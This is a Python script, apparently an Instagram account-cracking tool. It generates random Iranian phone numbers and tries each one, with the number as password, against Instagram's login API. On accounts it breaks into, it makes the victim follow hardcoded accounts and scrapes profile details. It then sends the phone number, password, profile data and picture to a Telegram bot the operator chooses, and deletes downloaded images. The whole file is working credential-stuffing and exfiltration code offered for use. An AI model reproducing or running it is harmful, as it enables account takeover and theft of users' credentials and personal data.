import os
if os.name=="nft":exit()
else:pass
try:
	import  os , sys , random, requests , time , json , secrets,uuid,re,wget,user_agent
	import subprocess
	from bs4 import BeautifulSoup 
	from uuid import uuid4
	from time import sleep 
	
except:
	os.system('pip install requests')
	os.system('pip install bs4')
	os.system("pip install user_agent")
	os.system("pip install wget")
else:pass
for ili in os.listdir():
	if '.jpg' in ili:
		try:os.remove(ili)
		except:pass
		os.system(f"rm -rf {ili}")
	else:pass    
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

Sidra= f"""{K} 

   _____                _      _____ _____   
  / ____|              | |    |_   _/ ____|  
 | |     _ __ __ _  ___| | __   | || |  __   
 | |    | '__/ _` |/ __| |/ /   | || | |_ |  
 | |____| | | (_| | (__|   <   _| || |__| |  
  \_____|_|  \__,_|\___|_|\_\ |_____\_____|  
                                             
                                             

""" 
Tk = f"""{K}

   _____                _      _____ _____   
  / ____|              | |    |_   _/ ____|  
 | |     _ __ __ _  ___| | __   | || |  __   
 | |    | '__/ _` |/ __| |/ /   | || | |_ |  
 | |____| | | (_| | (__|   <   _| || |__| |  
  \_____|_|  \__,_|\___|_|\_\ |_____\_____|  
                                             
                                             

""" 
os.system('clear')
os.system('rm -rf .a.txt')
os.system("xdg-open https://t.me/zed_cracker_1")
def Combo():
	os.system('clear')
	Sik = 0
	print(Sidra)
	x0 = "+98"
	xx = "0"
	xa = ["912","913","914","910","991"]
	f = "0123456789"
	for x in range(30000):
		x1 = random.choice(f)
		x2 = random.choice(f)
		x3 = random.choice(f)
		x4 = random.choice(f)
		x5 = random.choice(f)
		x6 = random.choice(f)
		x7 = random.choice(f)
		x8 = random.choice(xa)
		x9 = str(x1)+str(x2)+str(x3)+str(x4)+str(x5)+str(x6)+str(x7)
		x10 = str(x0)+str(x8)+str(x9)
		x11 = str(xx)+str(x8)+str(x9)
		Sik+=1
		print(f"\r join.",end="")
		comb=open('.a.txt','a')
		comb.write(str(x10)+":"+str(x11)+"\n")
		

#------------------------------------------------------------------------------------------------------------------------
def Cod_zed():
	os.system('clear')
	global comb,Sidra,Tk
	print(Sidra)
	print(E+"-"*50)
	token = input(A+""+E+""+A+""+H+ " Enter Token :"+C)
	ID = input(A+""+E+""+A+""+H+ " Enter ID Tele :"+C)
	print(E+"-"*50)
	Ok = 0
	Cp = 0
	Sk = 0
	fil=open('.a.txt', 'r')	
	
	while True:
		file=fil.readline().split('\n')[0]
		if file == '':
			print ("{} Examination is over".format(A))
			break
		
		Email=file.split(':')[0]
		pas=file.split(':')[1]
		r = requests.session()
		tt=time.asctime()
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'}
		uid = str(uuid4())
		data = { 
        'uuid': uid,
       'password': pas,
       'username': Email,
	   'device_id': uid,
	   'from_reg': 'false',
	   '_csrftoken': 'missing',
       'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=data)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			usus=user_agent.generate_user_agent()
			cook = req.cookies['sessionid']
			#
			hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
			data_get_info = {'__a': '1'}
			urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
			requests.post(urll,headers=hedDLT)
			
			#
			hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/ll.beta.ll/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
			data_get_info = {'__a': '1'}
			urll = 'https://www.instagram.com/web/friendships/8292873768/follow/'
			requests.post(urll,headers=hedDLT)
			
			#
			hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/rawezh._.bbx/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
			data_get_info = {'__a': '1'}
			urll = 'https://www.instagram.com/web/friendships/6052944430/follow/'
			requests.post(urll,headers=hedDLT)
			for ili in os.listdir():
				if '.jpg' in ili:
					try:os.remove(ili)
					except:pass
					os.system(f"rm -rf {ili}")
				else:pass    
		
			try:
			
				try:
					headers_get_info = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid='+str(cook)+'; rur=VLL','referer': 'https://www.instagram.com/accounts/edit/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
					url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
					req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
					usernm = str(req_get_info.json()['form_data']['username'])
					url = f"https://www.instagram.com/{usernm}?hl=en"
					r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
					soup = BeautifulSoup(r,'html.parser')
					description = soup.find("meta", property="og:description")
					uurl=f"https://www.instagram.com/{usernm}/?__a=1"
					hheaders={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','cookie': 'mid=YR2RKQALAAHrCbQwbS5NFzTCStuh; ig_did=424344B5-DCDF-4888-BD13-C56BE8BFF561; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; csrftoken=dq4i5qyC7mjFnr731RllWR0mvBf6w9nE; ds_user_id=44727257007; sessionid={cook}; shbid="8034\05444727257007\0541662125439:01f7c6e350cdd9d116745fbd697cadba8c1f58890de93e610ad53149cc44919876d79d91"; shbts="1630589439\05444727257007\0541662125439:01f718500f57b83260e7e22f8dd8c956a44d5dc5e8d0320a672aa6c651455f1570febc62"; rur="ASH\05444727257007\0541662129376:01f731bcc2afd2169af0bc7d969665be3b30ac3eaaa6603311276a0b02950003791bf2a0"','referer': 'https://codeofaninja.com/','sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'cross-site','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': str(usus)}
					pr={'__a': '1'}
					inin=requests.get(uurl,headers=hheaders,data=pr)
					profile_img=inin.json()['graphql']['user']['profile_pic_url_hd']
					full_name=inin.json()['graphql']['user']['full_name']
					usrrr=inin.json()['graphql']['user']['username']
					id=inin.json()['graphql']['user']['id']
					followers=inin.json()['graphql']['user']['edge_followed_by']['count']
					following=inin.json()['graphql']['user']['edge_follow']['count']
					posts = description["content"].split(",")[2].split("-")[0]
					bio=inin.json()['graphql']['user']['biography']
					u2 = "https://o7aa.pythonanywhere.com/?id="+id
					g2 = requests.get(u2).text
					r2 = re.compile('"data":(.*?),')
					f2 = r2.findall(g2)
					cc=f2[0]
					print()
					wget.download(profile_img)
					numbb = 0 
					for ili in os.listdir():
						if numbb == 1:pass
						elif '.jpg' in ili:
							numbb += 1
							files={'document':open(ili, 'rb')}
							boooom=(f"\nNumber: {Email}\nPassowrd: {pas}\nUsername: {usrrr}\nID: {id}\nFull_Name: {full_name}\nFollowers: {followers}\nfollowing: {following}\nPost: {posts}\nCreated: {cc}\nBio:-\n{bio}")
							requests.post(f'https://api.telegram.org/bot{token}/sendDocument?chat_id={ID}&caption={boooom}', files=files)
					numbb - 1
				except:
					try:
						boooomm=("GOOD: "+Email+":"+pas)
						requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooomm}\n')
					except:pass
				for ili in os.listdir():
					if '.jpg' in ili:
						try:os.remove(ili)
						except:pass
						try:os.system(f"rm -rf {ili}")
						except:pass
					else:pass
			except:
				Sidraok=f"GOOD: {Email}:{pas}"
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
		else:
			os.system('clear')
			Sk+=1
			print(Tk)
			print()
			print(f"   {E}Hacked: {A}{Ok}  {L}|  {C}Testing: {K}[ {A}{Email}:{pas}{K} ]")
Combo()
Cod_zed()

